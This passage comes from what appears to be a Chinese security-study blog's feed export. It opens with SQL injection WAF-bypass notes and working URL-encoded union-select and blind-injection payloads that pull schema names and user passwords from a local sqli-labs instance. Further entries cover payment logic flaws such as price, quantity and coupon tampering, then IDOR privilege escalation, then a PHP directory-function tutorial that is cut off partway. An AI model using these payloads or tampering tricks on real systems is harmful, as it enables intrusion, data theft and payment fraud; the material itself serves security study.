union /*!10044select*/ 1,2,3 -- qwe/*%0afrom admin%23*/<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    %0a:表示换行；-- qwe,#:只能注释单行；</span><br><span class="line"></span><br><span class="line">  + &#39;sleep&#39;(5),&#39;updataxml&#39;可绕过</span><br><span class="line">+ **编码绕过 （比如会多次解码的东西，例如我们DOM XSS绕狗那个）**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+  **等价替换 （利用其它函数替代）[union #%0aselect 拦截][union all #%0aselect 不拦截]**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+ **容器特性（例如Apace的Hpp,或者是IIS的%分割）**</span><br><span class="line"></span><br><span class="line">  + iis:s%e%l%e%c%t</span><br><span class="line"></span><br><span class="line">  + apace:</span><br></pre></td></tr></table></figure>?id=1/*&amp;id=2#*/<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    apace会将&#96;?id&#x3D;1&#x2F;*&#96;看作一起的，会与waf所比配的不一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+ **白名单（管理员权限或者是127.0.0.1本地访问不拦截）**</span><br><span class="line">  + 通过请求头&#x3D;&#x3D;X-Forwarded-For&#x3D;&#x3D;把IP修改为本地127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+ **缓冲区 （数据太多了，超出了WAF检测的范围）**</span><br><span class="line">  + 通过python脚本检测加多少个字符才会溢出</span><br><span class="line">  + GET传参要改成POST，GET传参用数量的限制（burp）</span><br><span class="line">  + 安全狗大概要填充4000多个，（要注释掉填充的字符）</span><br><span class="line"></span><br><span class="line">![](WAF绕过.assets&#x2F;20200324222133.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 某狗SQL注入WAF绕过</span><br><span class="line"></span><br><span class="line">+ ##### 绕过and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">  先使用&#96;and 1&#x3D;1&#96;和&#96;and 1&#x3D;2&#96;直接被拦截，</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327162936.png)</span><br><span class="line"></span><br><span class="line">  这里绕过方法是使用&#96;&amp;&amp;(%26%26)&#96;代替&#96;and&#96;，后面是个条件，可以使用&#96;True&#96;和&#96;False&#96;代替</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327163122.png)</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327163214.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> + ##### 绕过order by</span><br><span class="line"></span><br><span class="line">   之前版本绕过&#96;order by&#96;的方法很简单就是使用内联注释，如&#96;&#x2F;*!order*&#x2F;&#x2F;**&#x2F;&#x2F;*!by*&#x2F;&#96;来绕过，但是现在不行了，于是在网上看了看其它&#96;WAF&#96;绕过方式，**发现&#96;order&#x2F;*!60000ghtwf01*&#x2F;by&#96;可以实现绕过**，数字要大于&#96;50000&#96;，不然就是报错，后面随便接字母</span><br><span class="line"></span><br><span class="line">   ![](WAF绕过(sql注入).assets&#x2F;20200327163426.png)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">+ ##### 绕过union select</span><br><span class="line"></span><br><span class="line">  尝试使用&#96;order by&#96;的绕过姿势，&#96;union&#x2F;*!60000ghtwf01*&#x2F;select&#96;，发现成功绕过</span><br><span class="line"></span><br><span class="line">![](WAF绕过(sql注入).assets&#x2F;20200327163647.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+ ##### 绕过database()</span><br><span class="line"></span><br><span class="line">  直接查询&#96;database()&#96;会被拦截</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327163817.png)</span><br><span class="line"></span><br><span class="line">  使用&#96;database&#x2F;**&#x2F;()&#96;可以绕过</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327163857.png)</span><br><span class="line"></span><br><span class="line">  使用-加上任意一个不存在的函数可以报错出数据库名，比如&#96;-ghtwf01()&#96;</span><br><span class="line"></span><br><span class="line">  ![](WAF绕过(sql注入).assets&#x2F;20200327163941.png)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">+ ##### 绕过schema_name</span><br><span class="line"></span><br><span class="line">  查询所有数据库名时，使用&#96;schema_name&#96;会被拦截，这里使用内联注释绕过</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;sql</span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union&#x2F;*!60000ghtwf01*&#x2F;select%201,(select%20group_concat(&#x2F;*!schema_name*&#x2F;)%20from%20information_schema.schemata),3--+</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><h5 id="绕过table-name"><a href="#绕过table-name" class="headerlink" title="绕过table_name"></a>绕过table_name</h5><p>查询所有数据库名时，使用<code>table_name</code>会被拦截，这里使用内联注释绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=0%27%20union<span class="comment">/*!60000ghtwf01*/</span><span class="keyword">select</span>%<span class="number">201</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(<span class="comment">/*!table_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_schema=%<span class="number">27</span><span class="keyword">security</span>%<span class="number">27</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><h5 id="绕过column-name"><a href="#绕过column-name" class="headerlink" title="绕过column_name"></a>绕过column_name</h5><p>查询所有数据库名时，使用<code>column_name</code>会被拦截，这里使用内联注释绕过，<code>and</code>连接的时候<code>and</code>换为<code>%26%26</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=0%27%20union<span class="comment">/*!60000ghtwf01*/</span><span class="keyword">select</span>%<span class="number">201</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(<span class="comment">/*!column_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_schema=%<span class="number">27</span><span class="keyword">security</span>%<span class="number">27</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>table_name=<span class="number">0x7573657273</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><h5 id="绕过与from的结合查询字段内容"><a href="#绕过与from的结合查询字段内容" class="headerlink" title="绕过与from的结合查询字段内容"></a>绕过与from的结合查询字段内容</h5><p>使用<code>from.</code>绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=0%27%20union<span class="comment">/*!60000ghtwf01*/</span><span class="keyword">select</span>%<span class="number">201</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(username,<span class="number">0x7e</span>,<span class="keyword">password</span>,<span class="number">0x7e</span>)%<span class="number">20</span>from.%<span class="number">20</span><span class="keyword">users</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>查询数据库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20%26%26%20length(database<span class="comment">/**/</span>())=8<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>查询第一个数据库名的第一个字母，过滤了ascii()，这里使用hex()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20%26%26%20(hex(substr((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">concat</span>(<span class="comment">/*!schema_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.schemata%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">200</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">69</span>)%<span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>然后以此类推即可<br>查询表名的第一个字母，注意这里数据库名需要十六进制编码才行，否则会被拦截</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20%26%26%20(hex(substr((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span><span class="comment">/*!table_schema*/</span>=<span class="number">0x7365637572697479</span>%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">200</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">65</span>)%<span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>查询列名的第一个字母</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20%26%26%20(hex(substr((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">concat</span>(<span class="comment">/*!column_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_schema=<span class="number">0x7365637572697479</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>table_name=<span class="number">0x7573657273</span>%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">200</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">69</span>)%<span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>查询字段第一个字母，限制了<code>select</code>与<code>from</code>结合使用<code>from.</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20%26%26%20(hex(substr((<span class="keyword">select</span>%<span class="number">20</span>username%<span class="number">20</span>from.%<span class="number">20</span><span class="keyword">users</span>%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">200</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">74</span>)%<span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>过滤了<code>sleep()</code>函数，使用<code>benchmark()</code>函数即可，查询规则参考上面布尔盲注</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞</title>
      <link href="/2020/05/28/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/28/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、快捷支付原理"><a href="#一、快捷支付原理" class="headerlink" title="一、快捷支付原理"></a>一、快捷支付原理</h1><p><strong>商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知</strong></p><ul><li><p>§浏览器跳转（不常见）</p><ul><li>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性</li></ul></li><li><p>§服务器端异步通知</p><ul><li>该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等   </li></ul></li><li><p>支付漏洞属于==逻辑漏洞==，挖掘这类漏洞有发散（QiPa）思维，往往有事半功倍的效果，简单来说就是不按常理出牌。</p></li></ul><h1 id="二、常见支付漏洞"><a href="#二、常见支付漏洞" class="headerlink" title="二、常见支付漏洞"></a>二、常见支付漏洞</h1><p><strong>修改支付的价格（<a href="https://www.uedbox.com/post/22477/）" target="_blank" rel="noopener">https://www.uedbox.com/post/22477/）</a></strong></p><ul><li>§支付三步曲——订购、订单、付款<ul><li>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</li></ul></li></ul><p><strong>修改支付状态(<a href="https://www.uedbox.com/post/24090/" target="_blank" rel="noopener">https://www.uedbox.com/post/24090/</a>)</strong></p><ul><li>§订单完成——未完成（傻傻分不清）<ul><li>A订单-0001完成——B订单-0002未完成</li><li>付款时尝试把订单B的单号给成订单A</li></ul></li></ul><p><strong>不局限于付钱</strong></p><p><a href="http://woo.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156253" target="_blank" rel="noopener">http://woo.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156253</a></p><p><strong>修改订单数量（<a href="https://www.uedbox.com/post/23143/）" target="_blank" rel="noopener">https://www.uedbox.com/post/23143/）</a></strong></p><ul><li>一支笔1块，买0支，或者买-1支</li></ul><p><strong>修改附属值</strong></p><ul><li>优惠劵<ul><li>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</li></ul></li></ul><p><strong>越权支付</strong></p><ul><li>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</li></ul><p><strong>无限制试用</strong></p><ul><li>比如试用的参数为2，正常购买的参数为1。那么我们购买参数2（试用）</li><li>疯掉的逻辑（<a href="https://www.uedbox.com/post/12258/）" target="_blank" rel="noopener">https://www.uedbox.com/post/12258/）</a></li><li><a href="https://www.uedbox.com/web-security/wooyunbugs/" target="_blank" rel="noopener">https://www.uedbox.com/web-security/wooyunbugs/</a></li></ul><h1 id="三、支付漏洞如何挖掘"><a href="#三、支付漏洞如何挖掘" class="headerlink" title="三、支付漏洞如何挖掘"></a>三、支付漏洞如何挖掘</h1><p><strong>§找到关键的数据包</strong></p><ul><li>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</li></ul><p><strong>§分析数据包</strong></p><ul><li>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析</li></ul><p><strong>§不按套路出牌</strong></p><ul><li>多去想想开发者没有想到的地方</li></ul><p><strong>pc端尝试过，wap端也看看，app也试试</strong></p><h1 id="四、防御方法"><a href="#四、防御方法" class="headerlink" title="四、防御方法"></a>四、防御方法</h1><ul><li><h5 id="后端检查每一项值，包括支付状态。"><a href="#后端检查每一项值，包括支付状态。" class="headerlink" title="后端检查每一项值，包括支付状态。"></a>后端检查每一项值，包括支付状态。</h5></li><li><h5 id="校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量"><a href="#校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量" class="headerlink" title="校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量"></a>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量</h5></li><li><h5 id="与第三方支付平台检查，实际支付的金额是否与订单金额一致。"><a href="#与第三方支付平台检查，实际支付的金额是否与订单金额一致。" class="headerlink" title="与第三方支付平台检查，实际支付的金额是否与订单金额一致。"></a>与第三方支付平台检查，实际支付的金额是否与订单金额一致。</h5></li><li><h5 id="支付参数进行MD5-加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题"><a href="#支付参数进行MD5-加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题" class="headerlink" title="支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题"></a>支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</h5></li><li><h5 id="金额超过阈-yu-值，进行人工审核"><a href="#金额超过阈-yu-值，进行人工审核" class="headerlink" title="金额超过阈(yu)值，进行人工审核"></a>金额超过阈(yu)值，进行人工审核</h5></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>越权 - 通过修改参数获取管理员权限</title>
      <link href="/2020/05/28/%E8%B6%8A%E6%9D%83%20-%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/"/>
      <url>/2020/05/28/%E8%B6%8A%E6%9D%83%20-%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是越权？"><a href="#一、什么是越权？" class="headerlink" title="一、什么是越权？"></a>一、什么是越权？</h1><h3 id="越权漏洞的概念："><a href="#越权漏洞的概念：" class="headerlink" title="越权漏洞的概念："></a>越权漏洞的概念：</h3><p>​        越权漏洞是一种很常见的逻辑安全漏洞。是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。</p><h3 id="越权一般分为水平越权和垂直越权："><a href="#越权一般分为水平越权和垂直越权：" class="headerlink" title="越权一般分为水平越权和垂直越权："></a>越权一般分为水平越权和垂直越权：</h3><ul><li><p>水平越权是指==相同权限下不同的用户可以互相访问==</p></li><li><p>垂直越权是指==使用权限低的用户可以访问到权限较高的用户==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200321225204.png" alt="" loading="lazy"></p></li><li><p>水平越权测试方法主要就是看看能否通过A用户操作影响到B用户</p></li><li><p>垂直越权的测试思路就是低权限用户越权使用高权限用户的功能，比如普通用户可使用管理员功能。</p></li></ul><h1 id="二、越权测试过程"><a href="#二、越权测试过程" class="headerlink" title="二、越权测试过程"></a>二、越权测试过程</h1><p>==把握住传参就能把握住逻辑漏洞的命脉==</p><h3 id="越权测试"><a href="#越权测试" class="headerlink" title="越权测试"></a>越权测试</h3><p>​        登录A用户是，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试。（如果可以影响到高权限用户就是垂直越权）</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200321225550.png" alt="" loading="lazy"></p><p>​        <strong>传参ID参数需要自己检测（常见：uid= id= user= 等）通常使用burp进行爆破传参（传参可能在GET POST COOKIE）</strong></p><h3 id="常见平行越权"><a href="#常见平行越权" class="headerlink" title="常见平行越权"></a>常见平行越权</h3><ul><li><p>不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码+ </p></li><li><p>修改资料的时候修改用户id</p></li><li><p>查看订单的时候，遍历订单id</p></li></ul><h1 id="三、常见越权漏洞"><a href="#三、常见越权漏洞" class="headerlink" title="三、常见越权漏洞"></a>三、常见越权漏洞</h1><p>抓取传参可以在浏览器、APP、应用程序（exe）</p><ol><li><p>通过修改GET传参来越权（wooyun-2016-0205340）</p></li><li><p>修改POST传参进行越权（wooyun-2016-0207583）</p></li><li><p>修改cookie传参进行越权  （wooyun-2016-0184633）</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP操作目录</title>
      <link href="/2020/05/28/PHP%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95/"/>
      <url>/2020/05/28/PHP%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP操作目录"><a href="#PHP操作目录" class="headerlink" title="PHP操作目录"></a>PHP操作目录</h1><h2 id="创建新目录mkdir"><a href="#创建新目录mkdir" class="headerlink" title="创建新目录mkdir()"></a>创建新目录mkdir()</h2><p>描述：尝试新建一个由 pathname 指定的目录。</p><p>语法：<code>bool mkdir ( string $pathname [, int $mode = 0777 [, bool $recursive = false ]] )</code></p><p>参数：</p><ul><li><p>$pathname：指定目录的路径；</p></li><li><p>$mode：默认的 mode 是 0777，意味着最大可能的访问权。​$mode在windows下被忽略。 注意$mode的值为八进制。</p></li><li><p>$recursive：如果指定的路径的上级目录不存在，则也会递归创建</p><p>返回值：成功时返回TRUE，失败时返回FALSE。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135133.png" alt="" loading="lazy"></p><h2 id="判断是否是一个目录is-dir"><a href="#判断是否是一个目录is-dir" class="headerlink" title="判断是否是一个目录is_dir()"></a>判断是否是一个目录is_dir()</h2><p>描述：判断给定文件名是否是一个目录。</p><p>语法：<code>bool is_dir ( string $filename )</code></p><p>返回值：如果文件名存在，并且是个目录，返回 TRUE，否则返回FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135338.png" alt="" loading="lazy"></p><h2 id="判断目录或文件是否存在file-exists"><a href="#判断目录或文件是否存在file-exists" class="headerlink" title="判断目录或文件是否存在file_exists()"></a>判断目录或文件是否存在file_exists()</h2><p>语法：<code>bool file_exists ( string $filename )</code></p><p>提示：可以判断文件，也可以判断目录，是否存在。</p><p>返回：如果由 filename 指定的文件或目录存在则返回 TRUE，否则返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135525.png" alt="" loading="lazy"></p><h2 id="删除目录rmdir"><a href="#删除目录rmdir" class="headerlink" title="删除目录rmdir()"></a>删除目录rmdir()</h2><p>语法：<code>bool rmdir ( string $dirname )</code></p><p>参数：$dirname目录路径。</p><p>返回值：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><p>提示：尝试删除 dirname 所指定的目录。==该目录必须是空的，且要有相应的权限==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135642.png" alt="" loading="lazy"></p><h2 id="更改目录的访问权限chmod"><a href="#更改目录的访问权限chmod" class="headerlink" title="更改目录的访问权限chmod()"></a>更改目录的访问权限chmod()</h2><p>描述：改变文件的访问权限</p><p>语法：<code>bool chmod ( string $filename , int $mode )</code></p><p>参数：</p><ul><li><p>$filename，指定文件的路径；</p></li><li><p>$mode，mode 参数包含三个八进制数按顺序分别指定了==所有者、所有者所在的组==以及==所有人的访问限制==。每一部分都可以通过加入所需的权限来计算出所要的权限。==数字 1 表示使文件可执行，数字 2 表示使文件可写，数字 4 表示使文件可读。==加入这些数字来制定所需要的权限。</p></li><li><p>提示：在window下文件的只读权限是 0444。文件夹只读权限0555。</p></li></ul><p>注意：==<strong>此函数不能作用于远程文件</strong>。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135846.png" alt="" loading="lazy"></p><h2 id="取得目录或文件访问权限fileperms"><a href="#取得目录或文件访问权限fileperms" class="headerlink" title="取得目录或文件访问权限fileperms()"></a>取得目录或文件访问权限fileperms()</h2><p>语法：<code>int fileperms ( string $filename )</code></p><p>返回值：以==十进制数字==返回文件的访问权限。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528135953.png" alt="" loading="lazy"></p><h2 id="重命名或移动文件或目录rename"><a href="#重命名或移动文件或目录rename" class="headerlink" title="重命名或移动文件或目录rename()"></a>重命名或移动文件或目录rename()</h2><p>描述：重命名或移动一个文件或目录。如果文件不存在同一目录下，就是移动。</p><p>语法：<code>bool rename ( string $oldname , string $newname )</code></p><p>返回值：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528140058.png" alt="" loading="lazy"></p><h2 id="打开目录opendir"><a href="#打开目录opendir" class="headerlink" title="打开目录opendir()"></a>打开目录opendir()</h2><p>描述：打开目录句柄，可用于之后的 closedir()，readdir() 和 rewinddir() 调用中。</p><p>语法：<code>resource opendir ( string $path )</code></p><p>返回值：如果成功则返回目录句柄的 resource，失败则返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528141849.png" alt="" loading="lazy"></p><h2 id="读取目录中条目readdir"><a href="#读取目录中条目readdir" class="headerlink" title="读取目录中条目readdir()"></a>读取目录中条目readdir()</h2><p>描述：从目录句柄中读取条目 ;</p><p>语法：<code>string readdir ([ resource $dir_handle ] )</code></p><p>说明：返回目录中下一个文件的文件名。文件名以在文件系统中的排序返回。</p><p>返回：成功则返回文件名 或者在失败时返回 FALSE 。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142051.png" alt="" loading="lazy"></p><h2 id="显示中文目录或文件iconv"><a href="#显示中文目录或文件iconv" class="headerlink" title="显示中文目录或文件iconv()"></a>显示中文目录或文件iconv()</h2><p>描述：字符串按要求的字符编码来转换</p><p>语法：<code>string iconv ( string $in_charset , string $out_charset , string $str )</code></p><p>参数：</p><ul><li><p>$in_charset，输入的字符集；</p></li><li><p>$out_charset，输出的字符集；</p></li><li><p>$str，要转换的字符串；</p></li></ul><p>返回：返回转换后的字符串， 或者在失败时返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142215.png" alt="" loading="lazy"></p><h2 id="关闭目录句柄closedir"><a href="#关闭目录句柄closedir" class="headerlink" title="关闭目录句柄closedir()"></a>关闭目录句柄closedir()</h2><p>描述：关闭由 dir_handle 指定的目录流。流必须之前被 opendir() 所打开。 </p><p>语法：<code>void closedir ( [resource $dir_handle] )</code></p><p>提示：如果省略$dir_handle，则默认为最后由opendir()打开的目录句柄。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142257.png" alt="" loading="lazy"></p><h1 id="综合实例：递归遍历phpMyAdmin下的所有条目"><a href="#综合实例：递归遍历phpMyAdmin下的所有条目" class="headerlink" title="综合实例：递归遍历phpMyAdmin下的所有条目"></a>综合实例：递归遍历phpMyAdmin下的所有条目</h1><h2 id="递归思想"><a href="#递归思想" class="headerlink" title="递归思想"></a>递归思想</h2><p>递归思想：==把一个相对复杂的问题转化为一个与原问题相似的规模较小的问题来求解。==比如：求n的阶乘n!=n*(n-1)!。</p><p>递归方法==只需少量的程序==就可描述出解题过程所需要的==多次重复计算==，大大地减少了程序的代码量。但在带来便捷的同时，也会有一些缺点，即：通常用递归方法的运行效率不高。</p><p><img 